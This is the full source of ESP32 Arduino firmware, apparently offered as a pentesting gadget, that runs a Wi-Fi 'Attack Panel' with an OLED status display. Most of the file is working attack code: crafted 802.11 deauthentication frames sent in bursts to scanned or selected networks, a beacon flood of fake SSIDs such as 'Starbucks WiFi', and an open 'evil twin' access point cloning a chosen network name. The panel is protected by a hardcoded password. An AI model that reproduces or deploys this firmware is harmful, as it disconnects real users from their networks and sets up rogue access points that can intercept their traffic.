/*
 * ESP32 Advanced Deauther & Evil Twin - With OLED Display
 * Authorized Penetration Testing Tool
 */

#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <nvs_flash.h>
#include <vector>
#include <string.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

/* ================ OLED CONFIG ================ */
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET    -1
#define SCREEN_ADDRESS 0x3C
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

/* ================ CONFIG ================ */
const char* ap_ssid     = "ESP_Attack_Panel";
const char* ap_password = "hacktheplanet";
const int   WEB_PORT    = 80;

/* ================ GLOBALS ================ */
WebServer server(WEB_PORT);

// Target list
struct Target {
  uint8_t bssid[6];
  int channel;
  String ssid;
  int rssi;
  bool selected;
};
std::vector<Target> targets;
bool deauth_running = false;
bool beacon_flood_running = false;
bool evil_twin_running = false;
String evil_twin_ssid = "";
int current_channel = 1;

// Packet buffers
uint8_t deauth_frame[26];
uint8_t beacon_frame[256];

// Statistics
unsigned long packets_sent = 0;
unsigned long deauth_count = 0;
unsigned long beacon_count = 0;
unsigned long start_time = 0;

// OLED Update
unsigned long last_oled_update = 0;
int oled_page = 0;
unsigned long last_page_switch = 0;

/* ================ OLED FUNCTIONS ================ */
void oled_init() {
  if (!display.begin(SSD1306_SWITCHCAPVCC, SCREEN_ADDRESS)) {
    Serial.println("[!] OLED not found! Check wiring.");
    return;
  }
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.display();
  Serial.println("[+] OLED initialized successfully");
}

void oled_show_splash() {
  display.clearDisplay();
  
  // Title
  display.setTextSize(2);
  display.setCursor(10, 5);
  display.println("ESP32");
  display.setCursor(5, 25);
  display.println("ATTACK");
  
  display.setTextSize(1);
  display.setCursor(15, 48);
  display.println("Loading...");
  
  display.display();
  delay(1500);
}

void oled_show_main_status() {
  display.clearDisplay();
  
  // Title bar
  display.fillRect(0, 0, 128, 10, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(5, 2);
  display.println("ESP32 ATTACK PANEL");
  
  display.setTextColor(SSD1306_WHITE);
  
  // Line 1: Deauth status
  display.setCursor(0, 13);
  display.print("Deauth: ");
  if (deauth_running) {
    display.print("RUN");
    display.fillRect(68, 13, 8, 8, SSD1306_WHITE);
  } else {
    display.print("OFF");
    display.drawRect(68, 13, 8, 8, SSD1306_WHITE);
  }
  
  // Line 2: Beacon status
  display.setCursor(0, 23);
  display.print("Beacon: ");
  if (beacon_flood_running) {
    display.print("RUN");
    display.fillRect(68, 23, 8, 8, SSD1306_WHITE);
  } else {
    display.print("OFF");
    display.drawRect(68, 23, 8, 8, SSD1306_WHITE);
  }
  
  // Line 3: Evil Twin
  display.setCursor(0, 33);
  display.print("EvilTwin:");
  if (evil_twin_running) {
    display.print("ACTIVE");
  } else {
    display.print("OFF");
  }
  
  // Line 4: Targets count
  display.setCursor(0, 43);
  display.print("Targets: ");
  display.print(targets.size());
  
  // Line 5: Packets & channel
  display.setCursor(0, 53);
  display.print("PKT:");
  display.print(packets_sent);
  display.print(" CH:");
  display.print(current_channel);
  
  display.display();
}

void oled_show_targets() {
  display.clearDisplay();
  
  // Title bar
  display.fillRect(0, 0, 128, 10, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(5, 2);
  display.println("TARGETS");
  
  display.setTextColor(SSD1306_WHITE);
  
  // Show targets (max 5 at a time)
  int start_idx = 0;
  int max_show = 5;
  
  for (int i = start_idx; i < targets.size() && i < max_show; i++) {
    int y = 12 + (i * 10);
    
    if (targets[i].selected) {
      display.fillRect(0, y, 128, 9, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    
    String ssid = targets[i].ssid;
    if (ssid.length() > 10) {
      ssid = ssid.substring(0, 9) + ".";
    }
    
    display.setCursor(2, y + 1);
    display.print(i);
    display.print(" ");
    display.print(ssid);
    display.print(" CH:");
    display.print(targets[i].channel);
    
    display.setTextColor(SSD1306_WHITE);
  }
  
  if (targets.size() == 0) {
    display.setCursor(10, 28);
    display.println("No targets");
    display.setCursor(10, 38);
    display.println("Scan first!");
  }
  
  display.display();
}

void oled_show_stats() {
  display.clearDisplay();
  
  // Title bar
  display.fillRect(0, 0, 128, 10, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(5, 2);
  display.println("STATISTICS");
  
  display.setTextColor(SSD1306_WHITE);
  
  // Uptime
  unsigned long uptime = millis() / 1000;
  int hours = uptime / 3600;
  int mins = (uptime % 3600) / 60;
  int secs = uptime % 60;
  
  display.setCursor(0, 13);
  display.print("Uptime: ");
  display.printf("%02d:%02d:%02d", hours, mins, secs);
  
  display.setCursor(0, 23);
  display.print("Deauth Pkts: ");
  display.print(deauth_count);
  
  display.setCursor(0, 33);
  display.print("Beacon Pkts: ");
  display.print(beacon_count);
  
  display.setCursor(0, 43);
  display.print("Total Pkts: ");
  display.print(packets_sent);
  
  display.setCursor(0, 53);
  display.print("Free RAM: ");
  display.print(ESP.getFreeHeap() / 1024);
  display.print("KB");
  
  display.display();
}

void oled_loop() {
  unsigned long now = millis();
  
  // Switch page every 4 seconds
  if (now - last_page_switch > 4000) {
    last_page_switch = now;
    oled_page = (oled_page + 1) % 3;
  }
  
  // Update display at 10 FPS
  if (now - last_oled_update < 100) return;
  last_oled_update = now;
  
  switch (oled_page) {
    case 0:
      oled_show_main_status();
      break;
    case 1:
      oled_show_targets();
      break;
    case 2:
      oled_show_stats();
      break;
  }
}

/* ================ PACKET CRAFTING ================ */
void wifi_sniffer_packet_handler(void* buff, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buff;
  uint8_t *frame = pkt->payload;
  uint8_t frame_control = frame[0];
  
  if (frame_control == 0x80) {
    uint8_t bssid[6];
    memcpy(bssid, frame + 10, 6);
    
    uint8_t null_bssid[6] = {0};
    if (memcmp(bssid, null_bssid, 6) == 0) return;
    
    uint8_t esp_mac[6];
    WiFi.macAddress(esp_mac);
    if (memcmp(bssid, esp_mac, 6) == 0) return;
    
    char ssid[33] = {0};
    int ssid_len = 0;
    int pos = 36;
    int frame_len = pkt->rx_ctrl.sig_len;
    
    while (pos < frame_len - 2) {
      if (frame[pos] == 0x00) {
        ssid_len = frame[pos + 1];
        if (ssid_len > 32) ssid_len = 32;
        memcpy(ssid, &frame[pos + 2], ssid_len);
        ssid[ssid_len] = 0;
        break;
      }
      pos += frame[pos + 1] + 2;
    }
    
    if (ssid_len == 0) return;
    
    bool exists = false;
    int rssi = pkt->rx_ctrl.rssi;
    
    for (auto &t : targets) {
      if (memcmp(t.bssid, bssid, 6) == 0) {
        t.rssi = rssi;
        exists = true;
        break;
      }
    }
    
    if (!exists) {
      Target t;
      memcpy(t.bssid, bssid, 6);
      
      uint8_t ch;
      wifi_second_chan_t second;
      esp_wifi_get_channel(&ch, &second);
      t.channel = ch;
      
      t.ssid = String(ssid);
      t.rssi = rssi;
      t.selected = false;
      targets.push_back(t);
      
      if (targets.size() > 50) {
        targets.erase(targets.begin());
      }
    }
  }
}

/* ================ DEAUTH ATTACK ================ */
void craft_deauth_frame(uint8_t *bssid) {
  memset(deauth_frame, 0, 26);
  
  deauth_frame[0] = 0xC0;
  deauth_frame[1] = 0x00;
  deauth_frame[2] = 0x00;
  deauth_frame[3] = 0x00;
  
  memset(&deauth_frame[4], 0xFF, 6);
  memcpy(&deauth_frame[10], bssid, 6);
  memcpy(&deauth_frame[16], bssid, 6);
  
  static uint16_t seq = 0;
  deauth_frame[22] = seq & 0xFF;
  deauth_frame[23] = (seq >> 8) & 0xFF;
  seq += 256;
  
  deauth_frame[24] = 0x07;
  deauth_frame[25] = 0x00;
}

void send_deauth_packets(uint8_t *bssid, int channel) {
  uint8_t ch = (uint8_t)channel;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  delay(10);
  
  for (int i = 0; i < 50; i++) {
    craft_deauth_frame(bssid);
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    deauth_count++;
    packets_sent++;
    delay(1);
  }
  
  uint8_t client_mac[6];
  for (int i = 0; i < 20; i++) {
    for (int j = 0; j < 6; j++) {
      client_mac[j] = random(0, 255);
    }
    memcpy(&deauth_frame[4], client_mac, 6);
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    deauth_count++;
    packets_sent++;
    delay(1);
  }
}

void deauth_loop(void *param) {
  while (deauth_running) {
    if (targets.size() == 0) {
      delay(1000);
      continue;
    }
    
    std::vector<int> selected_indices;
    for (int i = 0; i < targets.size(); i++) {
      if (targets[i].selected) {
        selected_indices.push_back(i);
      }
    }
    
    if (selected_indices.size() == 0) {
      for (auto &t : targets) {
        send_deauth_packets(t.bssid, t.channel);
        delay(5);
      }
    } else {
      for (int idx : selected_indices) {
        send_deauth_packets(targets[idx].bssid, targets[idx].channel);
        delay(5);
      }
    }
    
    delay(10);
  }
  
  vTaskDelete(NULL);
}

/* ================ BEACON FLOOD ================ */
void craft_beacon_frame(uint8_t *bssid, const char *ssid, int channel) {
  memset(beacon_frame, 0, 256);
  
  beacon_frame[0] = 0x80;
  beacon_frame[1] = 0x00;
  beacon_frame[2] = 0x00;
  beacon_frame[3] = 0x00;
  
  memset(&beacon_frame[4], 0xFF, 6);
  memcpy(&beacon_frame[10], bssid, 6);
  memcpy(&beacon_frame[16], bssid, 6);
  
  static uint16_t seq = 0;
  beacon_frame[22] = seq & 0xFF;
  beacon_frame[23] = (seq >> 8) & 0xFF;
  seq += 256;
  
  uint64_t timestamp = esp_timer_get_time();
  memcpy(&beacon_frame[24], &timestamp, 8);
  
  uint16_t interval = 100;
  beacon_frame[32] = interval & 0xFF;
  beacon_frame[33] = (interval >> 8) & 0xFF;
  
  beacon_frame[34] = 0x01;
  beacon_frame[35] = 0x04;
  
  int pos = 36;
  int ssid_len = strlen(ssid);
  if (ssid_len > 32) ssid_len = 32;
  beacon_frame[pos++] = 0x00;
  beacon_frame[pos++] = ssid_len;
  memcpy(&beacon_frame[pos], ssid, ssid_len);
  pos += ssid_len;
  
  beacon_frame[pos++] = 0x01;
  beacon_frame[pos++] = 0x08;
  beacon_frame[pos++] = 0x82;
  beacon_frame[pos++] = 0x84;
  beacon_frame[pos++] = 0x8B;
  beacon_frame[pos++] = 0x96;
  beacon_frame[pos++] = 0x0C;
  beacon_frame[pos++] = 0x12;
  beacon_frame[pos++] = 0x18;
  beacon_frame[pos++] = 0x24;
  
  beacon_frame[pos++] = 0x03;
  beacon_frame[pos++] = 0x01;
  beacon_frame[pos++] = channel;
}

void beacon_flood_loop(void *param) {
  const char* fake_ssids[] = {
    "Free WiFi", "iPhone 15", "Android AP", 
    "Guest Network", "Home WiFi", "5G WiFi",
    "Cafe WiFi", "Hotel WiFi", "Library WiFi",
    "Office WiFi", "IoT Network", "Smart Home",
    "TP-Link_2412", "Netgear_5678", "Linksys_01",
    "Starbucks WiFi", "Airport Free", "School WiFi"
  };
  int num_ssids = sizeof(fake_ssids) / sizeof(fake_ssids[0]);
  uint8_t bssid[6];
  
  while (beacon_flood_running) {
    for (int ch = 1; ch <= 11; ch++) {
      uint8_t channel = (uint8_t)ch;
      esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
      
      for (int i = 0; i < 5; i++) {
        for (int j = 0; j < 6; j++) {
          bssid[j] = random(0, 255);
        }
        bssid[0] &= 0xFE;
        
        int idx = random(0, num_ssids);
        craft_beacon_frame(bssid, fake_ssids[idx], ch);
        esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, 256, false);
        beacon_count++;
        packets_sent++;
        delay(1);
      }
      
      delay(5);
    }
  }
  
  vTaskDelete(NULL);
}

/* ================ EVIL TWIN ================ */
void start_evil_twin(const char* ssid) {
  if (evil_twin_running) {
    WiFi.softAPdisconnect(true);
    delay(500);
  }
  
  evil_twin_ssid = String(ssid);
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(ssid, NULL, 1, 0, 1);
  evil_twin_running = true;
  
  Serial.println("[+] Evil Twin started: " + evil_twin_ssid);
}

void stop_evil_twin() {
  if (evil_twin_running) {
    WiFi.softAPdisconnect(true);
    delay(500);
    evil_twin_running = false;
    evil_twin_ssid = "";
    Serial.println("[+] Evil Twin stopped");
  }
}

/* ================ WIFI INIT ================ */
void wifi_init() {
  nvs_flash_init();
  esp_wifi_set_promiscuous(false);
  
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAP(ap_ssid, ap_password, 1, 0, 4);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
  
  uint8_t ch = 1;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_ps(WIFI_PS_NONE);
}

/* ================ WEB SERVER ================ */
String html_header() {
  return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>ESP32 Attack Panel</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0f; color: #00ff88; padding: 20px; }
    h1 { color: #ff4444; text-align: center; margin-bottom: 20px; font-size: 24px; text-transform: uppercase; letter-spacing: 2px; }
    h2 { color: #ff8844; margin: 15px 0; font-size: 18px; border-bottom: 1px solid #333; padding-bottom: 5px; }
    .container { max-width: 900px; margin: 0 auto; }
    table { width: 100%; border-collapse: collapse; margin: 10px 0; }
    th { background: #1a1a2e; color: #ff8844; padding: 8px; text-align: left; font-size: 13px; }
    td { padding: 6px 8px; border-bottom: 1px solid #222; font-size: 13px; }
    tr:hover { background: #111122; }
    .btn { display: inline-block; padding: 8px 16px; margin: 3px; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; font-weight: bold; text-decoration: none; }
    .btn-danger { background: #cc0000; color: white; }
    .btn-success { background: #00aa44; color: white; }
    .btn-warning { background: #cc8800; color: white; }
    .btn-info { background: #0066cc; color: white; }
    .btn-sm { padding: 4px 10px; font-size: 11px; }
    .status-box { background: #111122; border: 1px solid #333; border-radius: 8px; padding: 15px; margin: 10px 0; }
    .status-item { margin: 5px 0; }
    .label { color: #888; }
    input[type=text] { padding: 8px; background: #1a1a2e; border: 1px solid #333; color: #00ff88; border-radius: 4px; width: 200px; }
    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
    @media (max-width: 600px) { .grid-2 { grid-template-columns: 1fr; } }
    input[type=checkbox] { transform: scale(1.3); margin: 5px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="container">
    <h1>ESP32 Attack Panel</h1>
)rawliteral";
}

String html_footer() {
  return R"rawliteral(
    <div style="text-align: center; margin-top: 20px; color: #444; font-size: 12px;">
      ESP32 Attack Panel | Authorized Use Only
    </div>
  </div>
</body>
</html>
)rawliteral";
}

String generate_html() {
  String body = R"rawliteral(
    <div class="grid-2">
      <div class="status-box">
        <h2>Status</h2>
        <div class="status-item"><span class="label">Deauth:</span> %DEAUTH_STATUS%</div>
        <div class="status-item"><span class="label">Beacon Flood:</span> %BEACON_STATUS%</div>
        <div class="status-item"><span class="label">Evil Twin:</span> %EVIL_TWIN_STATUS%</div>
        <div class="status-item"><span class="label">Active Targets:</span> %TARGET_COUNT%</div>
        <div class="status-item"><span class="label">Packets Sent:</span> %PACKET_COUNT%</div>
        <div class="status-item"><span class="label">Free Heap:</span> %FREE_HEAP% bytes</div>
      </div>
      
      <div class="status-box">
        <h2>Controls</h2>
        <div style="margin: 5px 0;">
          <a href="/deauth/start" class="btn btn-danger" onclick="return confirm('Start deauth attack?')">Deauth Start</a>
          <a href="/deauth/stop" class="btn btn-success">Deauth Stop</a>
        </div>
        <div style="margin: 5px 0;">
          <a href="/beacon/start" class="btn btn-warning" onclick="return confirm('Start beacon flood?')">Beacon Flood</a>
          <a href="/beacon/stop" class="btn btn-success">Beacon Stop</a>
        </div>
        <div style="margin: 5px 0;">
          <a href="/scan" class="btn btn-info">Scan Networks</a>
          <a href="/clear" class="btn btn-warning">Clear List</a>
        </div>
      </div>
    </div>
    
    <div class="status-box">
      <h2>Evil Twin (Fake AP)</h2>
      <form action="/eviltwin" method="GET" style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
        <input type="text" name="ssid" placeholder="Enter SSID to clone..." required>
        <input type="submit" class="btn btn-warning" value="Start Evil Twin">
        <a href="/eviltwin/stop" class="btn btn-success">Stop Evil Twin</a>
      </form>
      <div style="margin-top: 8px;">
        <span class="label">Current Evil Twin SSID:</span> %EVIL_TWIN_SSID%
      </div>
    </div>
    
    <div class="status-box">
      <h2>Target Networks (%TARGET_COUNT%)</h2>
      <form action="/select" method="GET">
        <table>
          <tr>
            <th>Select</th>
            <th>SSID</th>
            <th>BSSID</th>
            <th>CH</th>
            <th>RSSI</th>
            <th>Action</th>
          </tr>
          %TARGET_ROWS%
        </table>
        <div style="margin-top: 10px;">
          <button type="submit" class="btn btn-info btn-sm">Update Selection</button>
          <a href="/selectall" class="btn btn-warning btn-sm">Select All</a>
          <a href="/deselectall" class="btn btn-info btn-sm">Deselect All</a>
        </div>
      </form>
    </div>
  )rawliteral";

  // Replace placeholders
  body.replace("%DEAUTH_STATUS%", deauth_running ? "<span style='color:#ff4444;font-weight:bold'>RUNNING</span>" : "Stopped");
  body.replace("%BEACON_STATUS%", beacon_flood_running ? "<span style='color:#ff4444;font-weight:bold'>RUNNING</span>" : "Stopped");
  body.replace("%EVIL_TWIN_STATUS%", evil_twin_running ? "<span style='color:#ffaa00;font-weight:bold'>ACTIVE (" + evil_twin_ssid + ")</span>" : "Inactive");
  body.replace("%TARGET_COUNT%", String(targets.size()));
  body.replace("%PACKET_COUNT%", String(packets_sent));
  body.replace("%FREE_HEAP%", String(ESP.getFreeHeap()));
  body.replace("%EVIL_TWIN_SSID%", evil_twin_running ? evil_twin_ssid : "-");

  String rows = "";
  for (int i = 0; i < targets.size(); i++) {
    char bssid_str[18];
    sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X",
            targets[i].bssid[0], targets[i].bssid[1], targets[i].bssid[2],
            targets[i].bssid[3], targets[i].bssid[4], targets[i].bssid[5]);
    
    String checked = targets[i].selected ? "checked" : "";
    rows += "<tr>";
    rows += "<td><input type='checkbox' name='t" + String(i) + "' " + checked + "></td>";
    rows += "<td>" + targets[i].ssid + "</td>";
    rows += "<td>" + String(bssid_str) + "</td>";
    rows += "<td>" + String(targets[i].channel) + "</td>";
    rows += "<td>" + String(targets[i].rssi) + " dBm</td>";
    rows += "<td><a href='/attack/" + String(i) + "' class='btn btn-danger btn-sm'>Attack</a></td>";
    rows += "</tr>";
  }
  
  if (targets.size() == 0) {
    rows = "<tr><td colspan='6' style='text-align:center;color:#666;'>No targets found. Click Scan Networks to discover.</td></tr>";
  }
  
  body.replace("%TARGET_ROWS%", rows);
  
  return html_header() + body + html_footer();
}

void handle_root() {
  server.send(200, "text/html", generate_html());
}

void handle_scan() {
  targets.clear();
  WiFi.scanNetworks(true);
  delay(3000);
  
  int n = WiFi.scanComplete();
  if (n >= 0) {
    for (int i = 0; i < n; i++) {
      Target t;
      
      uint8_t *bssid_ptr = WiFi.BSSID(i);
      if (bssid_ptr) {
        memcpy(t.bssid, bssid_ptr, 6);
      }
      
      t.channel = WiFi.channel(i);
      t.ssid = WiFi.SSID(i);
      t.rssi = WiFi.RSSI(i);
      t.selected = false;
      
      if (t.ssid.length() > 0) {
        targets.push_back(t);
      }
    }
    WiFi.scanDelete();
  }
  
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handle_deauth_start() {
  if (!deauth_running) {
    deauth_running = true;
    xTaskCreatePinnedToCore(deauth_loop, "deauth", 4096, NULL, 10, NULL, 1);
    Serial.println("[+] Deauth attack STARTED");
  }
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handle_deauth_stop() {
  deauth_running = false;
  Serial.println("[+] Deauth attack STOPPED");
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handle_beacon_start() {
  if (!beacon_flood_running) {
    beacon_flood_running = true;
    xTaskCreatePinnedToCore(beacon_flood_loop, "beacon", 4096, NULL, 10, NULL, 1);
    Serial.println("[+] Beacon flood STARTED");
  }
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handle_beacon_stop() {
  beacon_flood_running = false;
  Serial.println("[+] Beacon flood STOPPED");
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handle_eviltwin() {
  if (server.hasArg("ssid")) {
    String ssid = server.arg("ssid");
    if (ssid.length() > 0) {
      start_evil_twin(ssid.c_str());
    }
  }
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handle_eviltwin_stop() {
  stop_evil_twin();
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handle_select() {
  for (int i = 0; i < targets.size(); i++) {
    String param = "t" + String(i);
    targets[i].selected = server.hasArg(param);
  }
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handle_selectall() {
  for (auto &t : targets) t.selected = true;
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handle_deselectall() {
  for (auto &t : targets) t.selected = false;
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handle_attack() {
  String idx_str = server.uri();
  idx_str.replace("/attack/", "");
  int idx = idx_str.toInt();
  
  if (idx >= 0 && idx < targets.size()) {
    Serial.printf("[+] Targeted attack on #%d (%s)\n", idx, targets[idx].ssid.c_str());
    for (int i = 0; i < 100; i++) {
      send_deauth_packets(targets[idx].bssid, targets[idx].channel);
      delay(2);
    }
  }
  
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handle_clear() {
  targets.clear();
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void setup_webserver() {
  server.on("/", handle_root);
  server.on("/scan", handle_scan);
  server.on("/deauth/start", handle_deauth_start);
  server.on("/deauth/stop", handle_deauth_stop);
  server.on("/beacon/start", handle_beacon_start);
  server.on("/beacon/stop", handle_beacon_stop);
  server.on("/eviltwin", handle_eviltwin);
  server.on("/eviltwin/stop", handle_eviltwin_stop);
  server.on("/select", handle_select);
  server.on("/selectall", handle_selectall);
  server.on("/deselectall", handle_deselectall);
  server.on("/clear", handle_clear);
  server.on("/attack/", handle_attack);
  
  server.begin();
}

/* ================ SETUP & LOOP ================ */
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  // Initialize OLED
  Wire.begin(21, 22); // SDA = GPIO21, SCL = GPIO22
  oled_init();
  oled_show_splash();
  
  Serial.println("\n================================");
  Serial.println("ESP32 Attack Panel Starting...");
  Serial.println("================================");
  Serial.print("SSID: "); Serial.println(ap_ssid);
  Serial.print("Password: "); Serial.println(ap_password);
  Serial.print("Web Panel: http://192.168.4.1");
  Serial.println("\n================================");
  
  wifi_init();
  setup_webserver();
  start_time = millis();
  
  Serial.println("[+] System Ready!");
}

void loop() {
  server.handleClient();
  
  // Update channel for display
  uint8_t ch;
  wifi_second_chan_t second;
  esp_wifi_get_channel(&ch, &second);
  current_channel = ch;
  
  // Update OLED
  oled_loop();
  
  // Channel hopping for discovery
  static unsigned long last_hop = 0;
  if (millis() - last_hop > 5000) {
    last_hop = millis();
    uint8_t ch = (uint8_t)random(1, 12);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  }
  
  delay(10);
}